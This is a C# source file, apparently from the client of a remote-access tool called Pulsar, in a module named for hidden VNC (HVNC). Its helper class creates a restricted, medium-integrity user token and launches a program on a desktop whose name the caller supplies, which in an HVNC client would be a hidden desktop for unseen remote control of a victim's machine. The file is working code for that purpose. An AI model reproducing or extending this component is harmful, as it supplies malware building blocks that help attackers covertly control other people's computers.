using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessHelper
    {
        public static bool RunAsRestrictedUser(string fileName, string DesktopName)
        {
            if (string.IsNullOrWhiteSpace(fileName))
            {
                throw new ArgumentException("Value cannot be null or whitespace.", "fileName");
            }
            IntPtr intPtr;
            if (!GetRestrictedSessionUserToken(out intPtr))
            {
                return false;
            }
            bool result;
            try
            {
                STARTUPINFO structure = default(STARTUPINFO);
                structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
                structure.lpDesktop = DesktopName;
                PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.Append(fileName);
                if (!CreateProcessAsUser(intPtr, null, stringBuilder, IntPtr.Zero, IntPtr.Zero, true, 0U, IntPtr.Zero, Path.GetDirectoryName(fileName), ref structure, out process_INFORMATION))
                {
                    result = false;
                }
                else
                {
                    result = true;
                }
            }
            finally
            {
                CloseHandle(intPtr);
            }
            return result;
        }

        private static bool GetRestrictedSessionUserToken(out IntPtr token)
        {
            token = IntPtr.Zero;
            IntPtr intPtr;
            if (!SaferCreateLevel(SaferScope.User, SaferLevel.NormalUser, SaferOpenFlags.Open, out intPtr, IntPtr.Zero))
            {
                return false;
            }
            IntPtr zero = IntPtr.Zero;
            TOKEN_MANDATORY_LABEL token_MANDATORY_LABEL = default(TOKEN_MANDATORY_LABEL);
            token_MANDATORY_LABEL.Label.Sid = IntPtr.Zero;
            IntPtr intPtr2 = IntPtr.Zero;
            try
            {
                if (!SaferComputeTokenFromLevel(intPtr, IntPtr.Zero, out zero, 0, IntPtr.Zero))
                {
                    return false;
                }
                token_MANDATORY_LABEL.Label.Attributes = 32U;
                token_MANDATORY_LABEL.Label.Sid = IntPtr.Zero;
                if (!ConvertStringSidToSid("S-1-16-8192", out token_MANDATORY_LABEL.Label.Sid))
                {
                    return false;
                }
                intPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL));
                Marshal.StructureToPtr<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL, intPtr2, false);
                if (!SetTokenInformation(zero, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, intPtr2, (uint)Marshal.SizeOf<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL)))
                {
                    return false;
                }
                token = zero;
                zero = IntPtr.Zero;
            }
            finally
            {
                SaferCloseLevel(intPtr);
                SafeCloseHandle(zero);
                if (token_MANDATORY_LABEL.Label.Sid != IntPtr.Zero)
                {
                    LocalFree(token_MANDATORY_LABEL.Label.Sid);
                }
                if (intPtr2 != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intPtr2);
                }
            }
            return true;
        }

        [DllImport("advapi32", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern bool SaferCreateLevel(SaferScope scope, SaferLevel level, SaferOpenFlags openFlags, out IntPtr pLevelHandle, IntPtr lpReserved);

        [DllImport("advapi32", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern bool SaferComputeTokenFromLevel(IntPtr LevelHandle, IntPtr InAccessToken, out IntPtr OutAccessToken, int dwFlags, IntPtr lpReserved);

        [DllImport("advapi32", SetLastError = true)]
        private static extern bool SaferCloseLevel(IntPtr hLevelHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        private static bool SafeCloseHandle(IntPtr hObject)
        {
            return hObject == IntPtr.Zero || CloseHandle(hObject);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        private const uint SE_GROUP_INTEGRITY = 32U;

        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        private struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;

            public uint Attributes;
        }

        private struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        public enum SaferLevel : uint
        {
            Disallowed,
            Untrusted = 4096U,
            Constrained = 65536U,
            NormalUser = 131072U,
            FullyTrusted = 262144U
        }

        public enum SaferScope : uint
        {
            Machine = 1U,
            User
        }

        [Flags]
        public enum SaferOpenFlags : uint
        {
            Open = 1U
        }

        private enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }
    }
}
